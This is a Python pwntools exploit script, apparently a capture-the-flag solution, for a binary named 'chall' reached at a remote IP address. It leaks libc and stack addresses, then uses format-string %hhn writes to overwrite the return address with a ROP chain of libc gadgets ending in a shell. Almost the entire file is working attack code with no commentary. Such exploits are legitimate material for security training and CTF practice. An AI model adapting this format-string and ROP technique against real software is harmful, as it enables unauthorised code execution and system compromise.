#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'

exe = ELF("./chall")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
p = process([exe.path])
p = remote('34.70.212.151',8002)

def write_addr(addr,payload):
    for i in range(6):
        p.recvuntil(b'>> ')
        p.sendline(b'2')
        p.recvuntil(b'>> ')
        frmt = f'%{payload[i]}c%8$hhn'.ljust(16,' ').encode() + p64(addr+i)
        p.sendline(frmt)


def print_0(addr):
        p.recvuntil(b'>> ')
        p.sendline(b'2')
        p.recvuntil(b'>> ')
        frmt = f'%8$n'.ljust(16,' ').encode() + p64(addr)
        p.sendline(frmt)


def main():
   

    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b'Have this: ')
    leak = p.recvline().strip()
    leak = int(leak,16)

    libc.address = leak - libc.sym['fgets']
    print('libc:'+hex(libc.address))
    p.recvuntil(b'>> ')
    p.sendline(b'2')
    p.recvuntil(b'>> ')
    p.sendline(b'%3$llX')
    stack = p.recvline().strip()
    stack = int(stack,16)
    print('stack:'+hex(stack))
    stack += 0x58
    print('ret_addr:'+hex(stack))

    write_addr(stack-8,p64(stack-0x50))
    write_addr(stack,p64(libc.address + 0x34661))
    print_0(stack+8)
    write_addr(stack+16,p64(libc.address + 0x26a3c))
    write_addr(stack+24,p64(stack+16+40))
    write_addr(stack+32,p64(libc.address + 0xeb58e))
    
    #pop r12  26a3c
 

    p.interactive()


if __name__ == "__main__":
    main()
